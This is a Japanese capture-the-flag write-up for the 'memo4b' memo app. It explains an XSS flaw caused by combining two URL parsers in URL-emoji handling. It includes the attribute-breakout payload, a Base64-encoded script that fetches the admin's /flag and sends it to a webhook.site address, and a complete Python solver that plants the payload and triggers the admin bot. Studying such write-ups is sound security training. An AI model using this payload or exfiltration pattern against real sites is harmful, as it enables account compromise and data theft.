# memo4b - Writeup

## 概要

memo4bは、シンプルなメモ共有アプリケーションです。この問題では、絵文字機能の脆弱性を利用します。具体的には、異なるURLパーサーを組み合わせて使用することで、XSSを引き起こすができます。

## 解法

アプリケーションには2種類の絵文字機能があります：

1. 通常の絵文字: `:smile:` → 😊
2. URL絵文字: `:https://example.com/image.png:` → `<img src="https://example.com/image.png">`


`app.js`の`processEmojis`関数を確認すると、URL絵文字の処理で2つの異なるURLライブラリが使用されています：

```javascript
if (name.match(/^https?:\/\//)) {
  try {
    const urlObj = new URL(name);  // WHATWG URL (安全)
    const baseUrl = urlObj.origin + urlObj.pathname;
    const parsed = parse(name);     // url-parse (脆弱)
    const fragment = parsed.hash || '';
    const imgUrl = baseUrl + fragment;
    
    return `<img src="${imgUrl}" style="height:1.2em;vertical-align:middle;">`;
  } catch (e) {
    return match;
  }
}
```

この実装では：
- WHATWG URLでベースのURLを安全に抽出
- url-parseでフラグメント部分(#以降)を取得
- 両者を結合して最終的なURLを生成

url-parseライブラリは、フラグメント内の特殊文字（特に`"`）をエンコードしません。これにより、以下のような攻撃が可能になります：

```
:https://example.com/x.jpg#" onerror="alert(1)" x=":
```

このペイロードは以下のHTMLに変換されます：

```html
<img src="https://example.com/x.jpg#" onerror="alert(1)" x="" style="height:1.2em;vertical-align:middle;">
```

`"`によってsrc属性が閉じられ、onerror属性が追加されることでXSSが成立します。

管理者のフラグを外部に送信するペイロードを作成します。ただし、JavaScriptコード内に`:`が含まれると絵文字の処理が正しく動作しないため、Base64エンコードを使用します：

```javascript
// 実行したいJavaScriptコード
fetch('/flag').then(r=>r.text()).then(f=>location='https://webhook.site/xxx?flag='+f)

// Base64エンコード
ZmV0Y2goJy9mbGFnJykudGhlbihyPT5yLnRleHQoKSkudGhlbihmPT5sb2NhdGlvbj0naHR0cHM6Ly93ZWJob29rLnNpdGUveHh4P2ZsYWc9JytmKQ==

// 最終的なペイロード
:https://example.com/x.jpg#" onerror="eval(atob('ZmV0Y2goJy9mbGFnJykudGhlbihyPT5yLnRleHQoKSkudGhlbihmPT5sb2NhdGlvbj0naHR0cHM6Ly93ZWJob29rLnNpdGUveHh4P2ZsYWc9JytmKQ=='))":
```

上記のペイロードを含むメモを投稿し、管理者ボットに投稿したメモのIDを入力して訪問させることによって、攻撃者が用意したサーバーでflagを受信できます。

## Solver

```python
#!/usr/bin/env python3
import requests
import base64

WEBHOOK_URL = "https://webhook.site/your-unique-id"  # 自分のWebhookに変更
WEB_URL = "http://localhost:50000"
BOT_URL = "http://localhost:50001"

# JavaScriptコードをBase64エンコード
js_code = f"fetch('/flag').then(r=>r.text()).then(f=>location='{WEBHOOK_URL}?flag='+f)"
encoded = base64.b64encode(js_code.encode()).decode()
payload = f':https://example.com/x.jpg#" onerror="eval(atob(\'{encoded}\'))":' 

data = {
    "title": "Test",
    "md": payload
}

# メモを投稿
r = requests.post(WEB_URL + "/", data=data, allow_redirects=False)
post_id = r.headers["Location"].split("/")[-1]
print(f"[+] Created post: {post_id}")

# ボットに訪問を依頼
r = requests.post(BOT_URL + "/visit", json={"postId": post_id})
print(f"[+] Bot visit status: {r.text}")

# Webhookでフラグを確認
print(f"[+] Check your webhook at: {WEBHOOK_URL}")
print("[+] Flag should appear there within 5 seconds...")
```